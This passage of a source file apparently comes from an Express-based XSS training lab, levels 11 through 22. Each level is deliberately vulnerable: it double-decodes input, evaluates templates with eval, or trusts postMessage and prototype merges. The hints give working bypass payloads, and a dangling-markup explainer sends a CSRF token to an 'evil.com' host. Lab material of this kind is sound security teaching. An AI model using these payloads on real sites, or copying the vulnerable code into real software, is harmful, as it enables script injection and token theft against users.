});

// ============================================================
// LEVEL 11 - Double Encoding Bypass (WAF + Application decode)
// ============================================================
app.get('/level/11', (req, res) => {
  logRawRequest(11, req);
  const rawMatch = req.url.match(/[?&]q=([^&]*)/);
  const rawQ = rawMatch ? rawMatch[1] : '';
  logToTerminal(11, 'decode', { step: 'Raw URL segment (q= value as captured from req.url)', value: rawQ });

  let wafDecoded;
  try { wafDecoded = decodeURIComponent(rawQ); } catch(e) { wafDecoded = rawQ; }
  logToTerminal(11, 'decode', {
    step: 'FIRST decode (WAF / edge decodes once)',
    before_first_decode: rawQ,
    after_first_decode: wafDecoded
  });

  const blocked = /<\/?script\b[^>]*>/i.test(wafDecoded)
    || /\bon\w+\s*=/i.test(wafDecoded)
    || /javascript\s*:/i.test(wafDecoded);

  logFilterLogic(11, 'WAF scan after 1st decode (tags, on*=, javascript:)', wafDecoded, blocked ? '[BLOCKED]' : '[PASS]', { blocked });

  if (blocked) {
    logToTerminal(11, 'warn', { note: 'Application second decode not reached — response is WAF block page.' });
    res.send(levelPage(
      'Double Encoding Bypass', 11, 'Expert',
      'A WAF decodes your input once and checks for dangerous patterns (<code>&lt;script&gt;</code>, event handlers, <code>javascript:</code>). If the WAF passes it, the application decodes <strong>again</strong> before rendering.',
      'The WAF decodes once and checks. The app decodes a <strong>second</strong> time. If you double-encode your payload, the WAF sees harmless percent-encoded text after its decode pass, but the app\'s second decode produces the real payload. Try typing <code>%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code> in the form (the form submission adds the first layer of encoding).',
      `<p style="color:#8b949e;margin-bottom:1rem;">The WAF decoded your input and found a dangerous pattern. Try to bypass the WAF.</p>
      <form method="GET">
        <input type="text" name="q" placeholder="Payload..." value="">
        <button type="submit">Submit</button>
      </form>
      <div class="output"><p style="color:#f85149;">WAF Blocked: Dangerous pattern detected after decoding.</p></div>`
    ));
    return;
  }

  let q;
  try { q = decodeURIComponent(wafDecoded); } catch(e) { q = wafDecoded; }
  logToTerminal(11, 'decode', {
    step: 'SECOND decode (application / framework)',
    before_second_decode: wafDecoded,
    after_second_decode: q
  });
  logToTerminal(11, 'success', { note: 'WAF passed; doubly-decoded value is rendered into HTML body.', rendered: q });

  const output = q ? `<div class="output"><p>Result: ${q}</p></div>` : '';
  res.send(levelPage(
    'Double Encoding Bypass', 11, 'Expert',
    'A WAF decodes your input once and checks for dangerous patterns (<code>&lt;script&gt;</code>, event handlers, <code>javascript:</code>). If the WAF passes it, the application decodes <strong>again</strong> before rendering.',
    'The WAF decodes once and checks. The app decodes a <strong>second</strong> time. If you double-encode your payload, the WAF sees harmless percent-encoded text after its decode pass, but the app\'s second decode produces the real payload. Try typing <code>%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code> in the form (the form submission adds the first layer of encoding).',
    `<p style="color:#8b949e;margin-bottom:1rem;">A WAF decodes your input once and scans for threats. If it passes, the application decodes it again before rendering. Can you sneak a payload past the WAF?</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    ${output}`
  ));
});

// ============================================================
// LEVEL 12 - Template Injection (client-side templating)
// ============================================================
app.get('/level/12', (req, res) => {
  logRawRequest(12, req);
  const q = req.query.q || '';
  const stripped = q.replace(/<[^>]*>/g, '');
  logFilterLogic(12, 'Server strip all tags /<[^>]*>/g', q, stripped, { note: '{{ }} template evaluated client-side on remainder.' });
  res.send(levelPage(
    'Client-Side Template Injection', 12, 'Expert',
    'All HTML tags are stripped server-side. But the page uses a naive client-side template engine that evaluates <code>{{expressions}}</code>.',
    'All HTML tags are removed, so you can\'t inject <code>&lt;script&gt;</code> or event handlers. But look at the client-side code &mdash; it replaces <code>{{...}}</code> with the result of <code>eval()</code>. Try: <code>{{alert(1)}}</code> or <code>{{constructor.constructor("alert(1)")()}}</code>.',
    `<p style="color:#8b949e;margin-bottom:1rem;">All HTML tags are stripped. But there's a client-side template engine processing the output...</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output" id="templateOutput">${stripped}</div>
    <script>
      // Naive client-side template engine
      (function() {
        var el = document.getElementById('templateOutput');
        var html = el.innerHTML;
        html = html.replace(/\\{\\{(.+?)\\}\\}/g, function(match, expr) {
          try { return eval(expr); } catch(e) { return match; }
        });
        el.innerHTML = html;
      })();
    </script>`
  ));
});

// ============================================================
// LEVEL 13 - postMessage XSS
// ============================================================
app.get('/level/13', (req, res) => {
  logRawRequest(13, req);
  logToTerminal(13, 'info', { note: 'No reflection. postMessage handler sinks e.data → innerHTML without origin check.' });
  res.send(levelPage(
    'postMessage XSS', 13, 'Expert',
    'No server-side reflection at all. The page listens for <code>window.postMessage()</code> events and renders content without origin validation.',
    'The page has a <code>message</code> event listener that writes received data to the DOM via <code>innerHTML</code> without checking the origin. Open your browser console and run: <code>window.postMessage("&lt;img src=x onerror=alert(1)&gt;", "*")</code>. In a real attack, you\'d embed the target in an iframe on your domain and post a message to it.',
    `<p style="color:#8b949e;margin-bottom:1rem;">This page listens for cross-window messages. There's no form here &mdash; find the vulnerable message handler in the source.</p>
    <p style="color:#8b949e;margin-bottom:1rem;">Tip: Open DevTools Console (F12) to interact with the page.</p>
    <div class="output" id="messageOutput">
      <p style="color:#484f58;">Waiting for messages...</p>
    </div>
    <script>
      // Vulnerable postMessage handler - no origin check!
      window.addEventListener('message', function(e) {
        // INSECURE: No origin validation, direct innerHTML
        document.getElementById('messageOutput').innerHTML = '<p>Received: ' + e.data + '</p>';
      });
    </script>`
  ));
});

// ============================================================
// LEVEL 14 - SVG Upload XSS
// ============================================================
const uploadedSVGs = [];
app.get('/level/14', (req, res) => {
  logRawRequest(14, req);
  logToTerminal(14, 'info', { note: 'Listing stored SVG previews; uploads sanitized only for <script> on POST.', count: uploadedSVGs.length });
  const previews = uploadedSVGs.map((svg, i) => `<div style="padding:1rem;border:1px solid #30363d;border-radius:8px;margin-bottom:0.5rem;background:#0d1117;">${svg}</div>`).join('');
  res.send(levelPage(
    'SVG Upload XSS', 14, 'Expert',
    'File upload accepts SVG content. <code>&lt;script&gt;</code> tags are stripped from uploads, but SVGs are rendered inline.',
    'SVGs support event handlers natively. The filter only blocks <code>&lt;script&gt;</code> tags. Try uploading SVG content like: <code>&lt;svg&gt;&lt;rect width="100" height="100" style="fill:red" onmouseover="alert(1)"/&gt;&lt;/svg&gt;</code> or <code>&lt;svg onload=alert(1)&gt;&lt;/svg&gt;</code>. SVG elements have their own event handler attributes that the filter doesn\'t catch.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Upload an SVG image. The server strips &lt;script&gt; tags but renders SVGs inline.</p>
    <form method="POST" action="/level/14">
      <textarea name="svg" rows="4" placeholder="Paste SVG markup here..." style="width:100%;min-width:100%;"></textarea>
      <button type="submit">Upload SVG</button>
    </form>
    <div style="margin-top:1rem;">${previews || '<p style="color:#484f58;">No uploads yet.</p>'}</div>
    <form method="POST" action="/level/14/clear" style="margin-top:1rem;"><button type="submit" style="background:#da3633;border-color:#f85149;color:#fff;">Clear Uploads</button></form>`
  ));
});

app.post('/level/14', (req, res) => {
  logRawRequest(14, req);
  let svg = req.body.svg || '';
  const before = svg;
  svg = svg.replace(/<\/?script\b[^>]*>/gi, '');
  logFilterLogic(14, 'SVG upload — strip <script> only', before, svg, { note: 'Event handlers in SVG preserved.' });
  if (svg) uploadedSVGs.push(svg);
  res.redirect('/level/14');
});

app.post('/level/14/clear', (req, res) => {
  logRawRequest(14, req);
  logToTerminal(14, 'warn', { action: 'Clear SVG uploads', removed: uploadedSVGs.length });
  uploadedSVGs.length = 0;
  res.redirect('/level/14');
});

// ============================================================
// LEVEL 15 - Mutation XSS (template content blind spot)
// ============================================================
app.get('/level/15', (req, res) => {
  logRawRequest(15, req);
  const q = req.query.q || '';
  logFilterLogic(15, 'Input embedded for client sanitizer + template promotion', '', q, { note: 'Server does not strip; DOMParser sanitizer runs in browser.' });
  res.send(levelPage(
    'Mutation XSS', 15, 'Expert',
    'A client-side sanitizer uses DOMParser + <code>querySelectorAll</code> to strip scripts and event handlers, then re-inserts via innerHTML. After insertion, the page instantiates any <code>&lt;template&gt;</code> elements to support dynamic content.',
    'The sanitizer walks the DOM with <code>querySelectorAll(\'*\')</code> — but this method <strong>does not pierce into <code>&lt;template&gt;</code> element content</strong>. Template content lives in a separate DocumentFragment that is invisible to DOM queries. So anything inside <code>&lt;template&gt;</code> survives sanitization. After the sanitizer runs, the page instantiates templates by moving their content into the live DOM — executing whatever was hidden inside. Try: <code>&lt;template&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/template&gt;</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">A sanitizer strips dangerous elements, then the page renders <code>&lt;template&gt;</code> content for dynamic components. Can you hide a payload the sanitizer can't see?</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output" id="mxssOutput"></div>
    <script>
      // Client-side sanitizer
      (function() {
        var input = ${JSON.stringify(q)};
        if (!input) return;
        // Parse with DOMParser (avoids innerHTML mutation during parsing)
        var parser = new DOMParser();
        var doc = parser.parseFromString('<div>' + input + '</div>', 'text/html');
        var root = doc.body.firstChild;
        // Remove <script> tags
        root.querySelectorAll('script').forEach(function(s) { s.remove(); });
        // Remove all event handlers
        root.querySelectorAll('*').forEach(function(el) {
          Array.from(el.attributes).forEach(function(attr) {
            if (attr.name.startsWith('on')) el.removeAttribute(attr.name);
          });
        });
        // Serialize and re-insert
        var sanitized = root.innerHTML;
        var output = document.getElementById('mxssOutput');
        output.innerHTML = sanitized;
        // Instantiate <template> elements for dynamic content rendering
        // (common pattern in frameworks — template content is assumed safe after sanitization)
        output.querySelectorAll('template').forEach(function(tmpl) {
          var clone = document.importNode(tmpl.content, true);
          tmpl.parentNode.insertBefore(clone, tmpl);
          tmpl.remove();
        });
      })();
    </script>`
  ));
});

// ============================================================
// LEVEL 16 - Recursive Filter (multi-pass)
// ============================================================
app.get('/level/16', (req, res) => {
  logRawRequest(16, req);
  let q = req.query.q || '';
  const startQ = q;
  let prev;
  let passes = 0;
  do {
    prev = q;
    q = q.replace(/<\/?script\b[^>]*>/gi, '');
    q = q.replace(/\bon\w+\s*=/gi, '');
    q = q.replace(/javascript\s*:/gi, '');
    q = q.replace(/alert/gi, '');
    q = q.replace(/eval/gi, '');
    q = q.replace(/prompt/gi, '');
    q = q.replace(/confirm/gi, '');
    q = q.replace(/Function/g, '');
    if (q !== prev) passes++;
  } while (q !== prev);
  logFilterLogic(16, `Recursive filter loop (${passes} mutating pass(es))`, startQ, q, { note: 'Loop until fixed point — try iframe/srcdoc for new context.' });
  const output = q ? `<div class="output"><p>Result: ${q}</p></div>` : '';
  res.send(levelPage(
    'Recursive Keyword Filter', 16, 'Expert',
    'The filter runs in a <strong>loop</strong> until no more changes occur. Strips: <code>&lt;script&gt;</code>, event handlers (<code>on*=</code>), <code>javascript:</code>, <code>alert</code>, <code>eval</code>, <code>prompt</code>, <code>confirm</code>, <code>Function</code>. Nesting tricks won\'t work here.',
    'The recursive filter defeats nesting. But it only blocks specific execution functions and <code>Function</code> (case-sensitive!). You can still inject HTML tags. Think about: <code>&lt;iframe src="data:text/html,&lt;script&gt;parent.window.postMessage(1,\'*\')&lt;/script&gt;"&gt;</code> won\'t work due to script stripping. Instead try: <code>&lt;img src=x onerr</code>... wait, on* is blocked. What about <code>&lt;iframe srcdoc="..."&gt;</code>? The srcdoc creates a new document context that the server filter can\'t reach. Try: <code>&lt;iframe srcdoc="&amp;lt;img src=x onerror=&#x27;top[`al`+`ert`](1)&#x27;&amp;gt;"&gt;&lt;/iframe&gt;</code>. HTML-encode the payload inside srcdoc so the server filter sees entities, but the browser decodes them in the iframe.',
    `<p style="color:#8b949e;margin-bottom:1rem;">The filter loops until clean. No nesting tricks, no keyword games. Think outside the box.</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    ${output}`
  ));
});

// ============================================================
// LEVEL 17 - The Polyglot (multiple contexts at once)
// ============================================================
app.get('/level/17', (req, res) => {
  logRawRequest(17, req);
  let q = req.query.q || '';
  const raw = q;
  q = q.replace(/<\/?script\b[^>]*>/gi, '');
  logFilterLogic(17, 'Strip <script> tags', raw, q);
  const mid = q;
  q = q.replace(/"/g, '&quot;');
  logFilterLogic(17, 'HTML-encode double quotes for attribute safety', mid, q, { note: 'Same string also placed in HTML body and JS single-quoted string.' });
  res.send(levelPage(
    'The Polyglot', 17, 'Expert',
    '<code>&lt;script&gt;</code> tags stripped. Double quotes are HTML-encoded. Your input appears in <strong>three different contexts simultaneously</strong>: HTML body, an HTML attribute, and a JavaScript string.',
    'Your input is in 3 places. Double quotes are encoded so attribute breakout with <code>"</code> is hard. But single quotes are NOT encoded. Focus on the JS string context: close the single-quoted string with <code>\'</code>, inject code, and comment out the rest. Try: <code>\';alert(1)//</code>. The same payload will appear harmlessly in the other two contexts but execute in the JS one. For a true polyglot that works across all contexts, think about: <code>\'--&gt;&lt;/style&gt;&lt;/script&gt;&lt;svg onload=alert(1)&gt;</code> &mdash; but remember, script tags are blocked. Focus on the weakest context.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Your input appears in three different contexts. Find the weakest one.</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output" style="margin-top:1rem;">
      <!-- Context 1: HTML body -->
      <p>HTML context: ${q}</p>
      <!-- Context 2: HTML attribute -->
      <input type="hidden" name="data" value="${q}">
      <!-- Context 3: JavaScript string -->
    </div>
    <script>
      var tracking = '${q.replace(/\\/g, '\\\\').replace(/'/g, "\\'")}';
    </script>
    <div class="output" style="margin-top:0.5rem;">
      <p style="color:#484f58;font-size:0.8rem;">Hint: View page source to see all three injection points.</p>
    </div>`
  ));
});

// ============================================================
// LEVEL 18 - DOM Clobbering
// ============================================================
app.get('/level/18', (req, res) => {
  logRawRequest(18, req);
  const q = req.query.q || '';
  let filtered = q.replace(/<\/?script\b[^>]*>/gi, '');
  logFilterLogic(18, 'Strip <script>', q, filtered);
  const f1 = filtered;
  filtered = filtered.replace(/\bon\w+\s*=/gi, '');
  logFilterLogic(18, 'Strip on* handlers', f1, filtered);
  const f2 = filtered;
  filtered = filtered.replace(/javascript\s*:/gi, '');
  logFilterLogic(18, 'Strip javascript: text', f2, filtered, { note: 'Browser may still decode entities in href when rendering.' });
  res.send(levelPage(
    'DOM Clobbering', 18, 'Expert',
    '<code>&lt;script&gt;</code> tags stripped, event handlers stripped, <code>javascript:</code> stripped. The page uses named DOM elements to configure behavior.',
    'The page reads <code>window.config.href</code> for a redirect URL. An <code>&lt;a&gt;</code> element with <code>id=config</code> would clobber <code>window.config</code>, and its native <code>.href</code> property returns the resolved URL. The server blocks <code>javascript:</code> as text, but <strong>HTML entities inside the href attribute are decoded by the browser</strong>, not the server. Try: <code>&lt;a id=config href="&#38;#106;&#38;#97;&#38;#118;&#38;#97;&#38;#115;&#38;#99;&#38;#114;&#38;#105;&#38;#112;&#38;#116;&#38;#58;alert(1)"&gt;click&lt;/a&gt;</code>.',
    `<p style="color:#8b949e;margin-bottom:1rem;">The page reads <code>window.config.href</code> to create a navigation link. Your HTML injection could overwrite <code>window.config</code>...</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: DOM Clobbering</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">In browsers, HTML elements with an <code>id</code> or <code>name</code> attribute automatically become properties of the <code>window</code> object. For example, <code>&lt;div id="foo"&gt;</code> makes <code>window.foo</code> reference that element. This is called <strong>DOM clobbering</strong> — injected HTML can overwrite global JavaScript variables without any script execution. If application code reads properties from <code>window.someVar</code> (e.g., <code>window.config</code>, <code>window.settings</code>), an attacker can inject HTML elements with matching IDs to hijack those values. Nested clobbering (using <code>&lt;form&gt;</code> + child elements, or <code>&lt;a&gt;</code> for <code>.href</code>) allows overwriting dot-notation paths like <code>config.href</code>. The <code>&lt;a&gt;</code> element\'s <code>.href</code> property is special — the browser resolves HTML entities and returns the full URL, making it a powerful clobber target.</p>
    </div>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output" id="clobberOutput">${filtered}</div>
    <div id="widgetArea"></div>
    <script>
      // Application code that trusts window.config
      (function() {
        var widget = document.getElementById('widgetArea');
        // Default config — but if someone clobbers window.config...
        if (typeof window.config !== 'undefined' && window.config && window.config.href) {
          // Create a clickable link using the config
          widget.innerHTML = '<div style="padding:1rem;background:#0d1117;border:1px solid #30363d;border-radius:8px;margin-top:1rem;"><a href="' + window.config.href + '" style="color:#58a6ff;">Click here to continue &rarr;</a></div>';
        } else {
          widget.innerHTML = '<div style="padding:1rem;background:#0d1117;border:1px solid #30363d;border-radius:8px;margin-top:1rem;color:#484f58;">No config loaded.</div>';
        }
      })();
    </script>`
  ));
});

// ============================================================
// LEVEL 19 - Prototype Pollution → XSS
// ============================================================
app.get('/level/19', (req, res) => {
  logRawRequest(19, req);
  const q = req.query.q || '';
  logFilterLogic(19, 'JSON merge — no HTML filter on query string', '', q, { note: 'Dangerous merge() allows __proto__; XSS when config.html read.' });
  res.send(levelPage(
    'Prototype Pollution → XSS', 19, 'Expert',
    'No direct HTML injection — input is treated as JSON and merged into a config object. A client-side rendering function checks <code>config.html</code> to render custom content.',
    'The <code>merge()</code> function does a naive recursive merge without checking for <code>__proto__</code>. If you submit JSON like <code>{"__proto__":{"html":"&lt;img src=x onerror=alert(1)&gt;"}}</code>, you pollute <code>Object.prototype.html</code>. When the render function checks <code>config.html</code>, it finds the polluted value via the prototype chain and writes it to innerHTML.',
    `<p style="color:#8b949e;margin-bottom:1rem;">This page merges your JSON input into a config object, then renders content. No direct HTML injection — but the merge is dangerously naive.</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: Prototype Pollution</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">Every JavaScript object inherits from <code>Object.prototype</code>. If an application does a naive deep merge/clone of user-controlled JSON, the attacker can set <code>__proto__</code> properties that pollute <strong>all</strong> objects in the runtime. For example, <code>{"__proto__": {"isAdmin": true}}</code> would make <code>({}).isAdmin === true</code> for every object. When combined with client-side rendering that checks <code>obj.someProperty</code> and uses it in <code>innerHTML</code>, this becomes an XSS vector — even though the attacker never directly injected HTML. Prototype pollution is particularly dangerous because it can affect code running <em>anywhere</em> in the application, not just at the injection point.</p>
    </div>
    <form method="GET">
      <input type="text" name="q" placeholder='{"key": "value"}' value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output" id="ppOutput"><p style="color:#484f58;">Submit JSON to configure the widget.</p></div>
    <script>
      // Vulnerable deep merge
      function merge(target, source) {
        for (var key in source) {
          if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
          } else {
            target[key] = source[key];
          }
        }
        return target;
      }

      (function() {
        var input = ${JSON.stringify(q)};
        if (!input) return;
        var config = { title: 'Widget' };
        try {
          var userObj = JSON.parse(input);
          merge(config, userObj);
        } catch(e) {
          document.getElementById('ppOutput').innerHTML = '<p style="color:#f85149;">Invalid JSON: ' + e.message + '</p>';
          return;
        }
        // Render widget — checks config.html for custom content
        var out = document.getElementById('ppOutput');
        out.innerHTML = '<h3 style="color:#58a6ff;margin-bottom:0.5rem;">' +
          (config.title || 'Widget') + '</h3>';
        if (config.html) {
          out.innerHTML += config.html;
        } else {
          out.innerHTML += '<p style="color:#8b949e;">Default widget content. Set "html" in config to customize.</p>';
        }
      })();
    </script>`
  ));
});

// ============================================================
// LEVEL 20 - Base Tag Injection
// ============================================================
app.get('/level/20', (req, res) => {
  logRawRequest(20, req);
  const q = req.query.q || '';
  let filtered = q.replace(/<\/?script\b[^>]*>/gi, '');
  logFilterLogic(20, 'Strip <script>', q, filtered);
  const a = filtered;
  filtered = filtered.replace(/\bon\w+\s*=/gi, '');
  logFilterLogic(20, 'Strip on*', a, filtered);
  const b = filtered;
  filtered = filtered.replace(/javascript\s*:/gi, '');
  logFilterLogic(20, 'Strip javascript:', b, filtered, { note: '<base> before relative <script src> + CSP nonce on scripts.' });
  const nonce = Math.random().toString(36).substring(2, 15);
  logToTerminal(20, 'info', { 'Content-Security-Policy': `script-src 'nonce-${nonce}' 'self'; base-uri *` });
  const html = levelPage(
    'Base Tag Injection', 20, 'Expert',
    'CSP: <code>script-src \'nonce-...\' \'self\'</code>. <code>&lt;script&gt;</code> tags stripped, event handlers stripped, <code>javascript:</code> stripped. But your input is injected <strong>before</strong> the page\'s script tags.',
    'Since your input appears before the page\'s own <code>&lt;script&gt;</code> tags that use relative URLs, you can inject a <code>&lt;base href="https://YOUR-SERVER/"&gt;</code> tag. This changes the base URL for all relative script/resource loads. If the page loads <code>&lt;script src="app.js"&gt;</code>, it will now fetch from <code>https://YOUR-SERVER/app.js</code>. For this lab, an attacker-controlled endpoint exists at <code>/evil/</code>. Try: <code>&lt;base href="/evil/"&gt;</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">Your input is rendered before the page's scripts. The page loads a relative script. CSP blocks inline scripts but allows 'self'.</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: Base Tag Injection</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">The <code>&lt;base&gt;</code> HTML element specifies the base URL for all relative URLs in a document. If an attacker can inject a <code>&lt;base&gt;</code> tag before the page's own scripts that use relative paths (like <code>src="app.js"</code>), they can redirect those script loads to an attacker-controlled server. This is especially powerful when CSP uses <code>'self'</code> or <code>'nonce'</code> — the scripts are "allowed" by CSP since the <code>src</code> attribute doesn't change, but they now load from a different origin. This is why CSP's <code>base-uri</code> directive exists: to prevent <code>&lt;base&gt;</code> injection.</p>
    </div>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output">${filtered}</div>
    <!-- TODO: remove /evil/ debug path before going to production!! -->
    <script src="level20-app.js"></script>`
  );
  res.set('Content-Security-Policy', `script-src 'nonce-${nonce}' 'self'; base-uri *`);
  res.send(html.replace(/<script>/g, `<script nonce="${nonce}">`).replace(/<script src=/g, `<script nonce="${nonce}" src=`));
});

// Legitimate app.js for level 20
app.get('/level20-app.js', (req, res) => {
  logRawRequest(20, req);
  logToTerminal(20, 'success', { asset: '/level20-app.js', note: 'Legitimate same-origin script.' });
  res.type('application/javascript');
  // TODO: cleanup - /evil/ route still active, disable before launch
  res.send('document.querySelector(".output").innerHTML += "<p style=\\"color:#3fb950;\\">Legitimate app.js loaded from same origin.</p>";');
});

// Attacker-controlled "evil" endpoint that serves malicious JS
app.get('/evil/level20-app.js', (req, res) => {
  logRawRequest(20, req);
  logToTerminal(20, 'warn', { asset: '/evil/level20-app.js', note: 'Attacker-controlled payload served if <base> hijacks relative script URL.' });
  res.type('application/javascript');
  res.send('alert("XSS via base tag injection!")');
});

// ============================================================
// LEVEL 21 - Dangling Markup Injection
// ============================================================
app.get('/level/21', (req, res) => {
  logRawRequest(21, req);
  const q = req.query.q || '';
  let filtered = q.replace(/<\/?script\b[^>]*>/gi, '');
  logFilterLogic(21, 'Strip <script>', q, filtered);
  let f = filtered;
  filtered = filtered.replace(/\bon\w+\s*=/gi, '');
  logFilterLogic(21, 'Strip on*', f, filtered);
  f = filtered;
  filtered = filtered.replace(/javascript\s*:/gi, '');
  logFilterLogic(21, 'Strip javascript:', f, filtered);
  f = filtered;
  filtered = filtered.replace(/<\/?(?:base|iframe|object|embed)\b[^>]*>/gi, '');
  logFilterLogic(21, 'Strip base/iframe/object/embed', f, filtered, { note: 'Bio field HTML; CSRF token adjacent for dangling markup exfil.' });

  res.send(levelPage(
    'Dangling Markup Injection', 21, 'Expert',
    '<code>&lt;script&gt;</code>, event handlers, <code>javascript:</code>, <code>&lt;iframe&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, <code>&lt;base&gt;</code> all stripped. A CSRF token is hidden in the page source.',
    'You can\'t execute JS directly. Your injection is <strong>inside a form</strong> that contains a hidden CSRF token. The <code>formaction</code> attribute on a <code>&lt;button&gt;</code> overrides the form\'s <code>action</code> for that button — redirect the submission to any URL on this server and the token will arrive as a query parameter. In a real attack this would be your own server. The page polls for successful exfiltration. This is a form of <strong>dangling markup / form hijacking</strong> — stealing data without executing any JavaScript.',
    `<p style="color:#8b949e;margin-bottom:1rem;">All script execution is blocked. But sometimes XSS isn't about executing code — it's about <strong>exfiltrating sensitive data</strong> from the page.</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: Dangling Markup Injection</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">When you can inject HTML but <strong>cannot</strong> execute JavaScript (due to CSP, WAF, or aggressive filtering), dangling markup is a technique to steal page content. The idea: inject a tag with an <strong>unclosed attribute value</strong> like <code>&lt;a href="http://evil.com/steal?</code>. The browser will treat everything from the injection point until the next matching quote as part of the URL. If there's a CSRF token, API key, or other secret between your injection and the next quote, it gets included in the link URL. When the victim clicks the link (or it auto-navigates via <code>&lt;meta refresh&gt;</code>), the secret is sent to the attacker's server. This doesn't require script execution — it exploits HTML parsing rules. Note: Modern Chrome blocks <code>&lt;img&gt;</code> dangling markup containing newlines, but <code>&lt;a href&gt;</code>, <code>&lt;form action&gt;</code>, <code>&lt;button formaction&gt;</code>, and <code>&lt;meta http-equiv=refresh&gt;</code> still work.</p>
    </div>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output">
      <form action="/level/21" method="GET" id="profileForm">
        <p style="margin-bottom:0.75rem;">Bio: ${filtered}</p>
        <input type="hidden" name="csrf_token" value="SUPER_SECRET_TOKEN_abc123xyz">
        <button type="submit" style="background:#238636;color:#fff;border:none;padding:0.5rem 1rem;border-radius:6px;cursor:pointer;">Update Profile</button>
      </form>
    </div>
    <p style="color:#484f58;font-size:0.8rem;margin-top:0.5rem;padding:0 1.5rem;">Your injection is inside a form that contains a hidden CSRF token. The form submits to <code>/level/21</code>. View page source (Ctrl+U). Can you redirect the form submission to exfiltrate the token — using only HTML?</p>
    <div id="leakStatus" style="margin-top:1rem;padding:1rem;background:#0d1117;border:1px solid #30363d;border-radius:8px;">
      <p style="color:#484f58;">Waiting for token exfiltration... (the page checks automatically)</p>
    </div>
    <script>
      // Poll the server to check if the token has been leaked
      (function poll() {
        fetch('/api/leak-check').then(function(r) { return r.json(); }).then(function(d) {
          if (d.leaked) {
            document.getElementById('leakStatus').innerHTML = '<p style="color:#3fb950;font-weight:600;">Token exfiltrated! The server received the secret.</p>';
            alert('Token Exfiltrated!');
          } else {
            setTimeout(poll, 1500);
          }
        }).catch(function() { setTimeout(poll, 3000); });
      })();
    </script>`
  ));
});

// Leak receiver for Level 21
app.get('/api/leak', (req, res) => {
  logRawRequest(21, req);
  const leaked = req.url.replace('/api/leak?', '');
  logToTerminal(21, leaked.includes('SUPER_SECRET_TOKEN') ? 'success' : 'warn', { step: 'Exfiltration endpoint hit', queryString: leaked });
  console.log('[Level 21] Dangling markup exfiltrated:', leaked);
  if (leaked.includes('SUPER_SECRET_TOKEN')) {
    level21Leaked = leaked;
    // Redirect back to the level with a success flag
    res.redirect('/level/21?q=&leaked=true');
  } else {
    res.send('No token found in request. Try adjusting your payload.');
  }
});

// Check if token was leaked (polled by level 21 page)
app.get('/api/leak-check', (req, res) => {
  if (level21Leaked) {
    const data = level21Leaked;
    logToTerminal(21, 'success', { step: 'leak-check: exfil confirmed to client', preview: String(data).slice(0, 220) });
    level21Leaked = false;
    res.json({ leaked: true, data: data });
  } else {
    res.json({ leaked: false });
  }
});

// ============================================================
// LEVEL 22 - JSON Injection in Script Block
// ============================================================
app.get('/level/22', (req, res) => {
  logRawRequest(22, req);
  const q = req.query.q || '';
  const escaped = q.replace(/</g, '\\u003c').replace(/>/g, '\\u003e');
  logFilterLogic(22, 'Unicode-escape < > for JSON-in-script embedding', q, escaped, { note: 'Double quotes NOT escaped — JSON breakout possible.' });
  const nonce = Math.random().toString(36).substring(2, 15);
  logToTerminal(22, 'info', { 'Content-Security-Policy': `script-src 'nonce-${nonce}' 'self'` });
  const html = levelPage(
    'JSON Injection in Script Block', 22, 'Expert',
    'Input is embedded inside a JSON object in a <code>&lt;script&gt;</code> block. Angle brackets are Unicode-escaped (<code>\\u003c</code>). CSP blocks inline scripts without the nonce.',
    'Your input is inside a JSON string value within a <code>&lt;script&gt;</code> tag. Angle brackets are escaped, so you can\'t inject new HTML tags. But you can close the JSON string with <code>"</code>, then inject JavaScript directly within the same script block. Try: <code>"-alert(1)-"</code> or <code>";alert(1);//</code>. Since you\'re already inside a nonced <code>&lt;script&gt;</code>, CSP allows execution. The key: <strong>you\'re already in a trusted JS context</strong>.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Your input is placed inside a JSON object within a trusted script block. Can you break out of the JSON value?</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
